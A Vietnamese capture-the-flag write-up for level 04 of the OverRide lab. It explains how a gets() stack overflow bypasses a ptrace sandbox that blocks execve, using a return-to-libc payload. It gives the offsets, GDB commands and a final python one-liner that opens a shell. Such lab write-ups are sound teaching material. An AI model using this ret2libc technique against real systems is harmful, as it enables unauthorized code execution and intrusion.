RELRO                STACK CANARY        NX                   PIE             RPATH        RUNPATH         FILE
Partial RELRO 🟡     No canary found 🔴   NX disabled 🔴      No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level04/level04
-----
---

# 📒 NHẬT KÝ KHAI THÁC: LEVEL 04 @ OVERRIDE

## 1. Phân tích "Giáp" (Security Protections)

* **NX disabled 🔴**: Về lý thuyết, ta có thể chạy Shellcode trực tiếp trên Stack.
* **No Canary 🔴**: Có thể ghi đè địa chỉ trả về (EIP) dễ dàng.
* **ASLR**: Có khả năng được bật trên hệ thống, nhưng trong môi trường Lab này, địa chỉ của thư viện `libc` thường cố định.

---

## 2. Phân tích Logic Code: "Ông bố nghiêm khắc" (The Sandbox)

Chương trình này cực kỳ thú vị vì nó sử dụng hàm `fork()` để tạo ra hai tiến trình hoạt động song song:

### A. Tiến trình Con (Child)

* Chịu trách nhiệm giao tiếp với người dùng.
* Sử dụng hàm **`gets(local_a0)`**: Đây là lỗ hổng chết người. `local_a0` chỉ rộng 128 bytes nhưng `gets` cho phép nhập không giới hạn $\rightarrow$ **Stack-based Buffer Overflow**.
* Nó mời gọi: *"Give me some shellcode, k"*. Đây thực chất là một cái bẫy.

### B. Tiến trình Cha (Parent)

* Đóng vai trò là một "Giám sát viên" (Monitor) sử dụng lệnh `ptrace`.
* Nó soi vào thanh ghi `ORIG_EAX` (vị trí `0x2c`) của con mỗi khi con định làm gì đó.
* **Luật lệ:** Nếu con gọi **Syscall số 11 (0xb)** — tức là hàm `execve` — cha sẽ lập tức giết (`kill`) con và báo lỗi `"no exec() for you"`.

> **Vấn đề:** 99% Shellcode truyền thống đều kết thúc bằng việc gọi `execve("/bin/sh")`. Vì vậy, dùng Shellcode bình thường ở bài này chắc chắn thất bại.

---

## 3. Chiến thuật: Kỹ thuật `ret2libc` (Return-to-libc)

Để thắng "ông bố", chúng ta không dùng Shellcode tự chế. Thay vào đó, chúng ta ép "đứa con" nhảy vào một hàm có sẵn trong hệ thống: hàm **`system()`**.

### Tại sao `system()` lại thành công?

Khi hàm `system("/bin/sh")` chạy, nó sẽ tự đẻ ra một "đứa cháu" (Grandchild). Đứa cháu này mới là đứa thực hiện lệnh `execve`. Vì "ông bố" chỉ giám sát "đứa con", nên "đứa cháu" hoàn toàn nằm ngoài vùng phủ sóng và có thể mở Shell thoải mái.

---

## 4. Xây dựng Payload (The Anatomy of Payload)

Chúng ta cần dàn dựng Stack của tiến trình con sao cho khi nó kết thúc, nó nghĩ rằng nó đang thực hiện một hàm hợp lệ.

### Cấu trúc Stack Frame giả lập:

| Thành phần | Giá trị | Ý nghĩa |
| --- | --- | --- |
| **Padding** | `A` * 156 | Lấp đầy từ biến `local_a0` đến EIP. |
| **EIP (Target)** | `0xf7e6aed0` | Địa chỉ của hàm `system()`. |
| **Return Address** | `JUNK` (4 bytes) | Nơi `system` nhảy về sau khi xong (ta không quan tâm). |
| **Argument 1** | `0xf7f897ec` | Địa chỉ chuỗi `"/bin/sh"` (Tham số cho `system`). |

---

## 5. Các bước tìm kiếm nguyên liệu (GDB)

1. **Tìm địa chỉ `system()**`: Dùng lệnh `print system` trong GDB.
2. **Tìm chuỗi `"/bin/sh"**`: Dùng lệnh `find &system, +9999999, "/bin/sh"`. Chuỗi này luôn nằm sẵn trong thư viện `libc` của Linux.
3. **Xác định Offset (156)**: 128 bytes của mảng + các biến cục bộ xung quanh nó (như `local_20`, `local_1c`...) + EBP cũ. Tổng cộng cần 156 bytes để chạm tới EIP.

---

## 6. Lệnh thực thi cuối cùng

```bash
(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "JUNK" + "\xec\x97\xf8\xf7"'; cat) | ./level04

```

* **`"A" * 156`**: Phá hủy cấu trúc Stack cũ.
* **`\xd0\xae\xe6\xf7`**: Điều hướng CPU nhảy vào `system`.
* **`\xec\x97\xf8\xf7`**: Đưa chuỗi `"/bin/sh"` làm mồi cho `system`.
* **`cat`**: Giữ cho đường ống (pipe) không bị đóng, cho phép ta gõ lệnh vào Shell sau khi chiếm được.

---

## 7. Bài học rút ra

* **Cơ chế giám sát (Introspection)**: `ptrace` là một công cụ mạnh mẽ để bảo vệ chương trình, nhưng nếu chỉ giám sát bề nổi mà không giám sát đệ quy, nó vẫn có thể bị bypass.
* **Sức mạnh của Thư viện**: Kỹ thuật `ret2libc` chứng minh rằng đôi khi "vũ khí" tốt nhất để tấn công một hệ thống chính là những công cụ nằm sẵn trong chính hệ thống đó.
* **Lỗ hổng logic**: Việc hiểu rõ mối quan hệ Cha-Con-Cháu trong Linux là chìa khóa để tìm ra lỗ hổng trong cơ chế bảo vệ của tác giả.
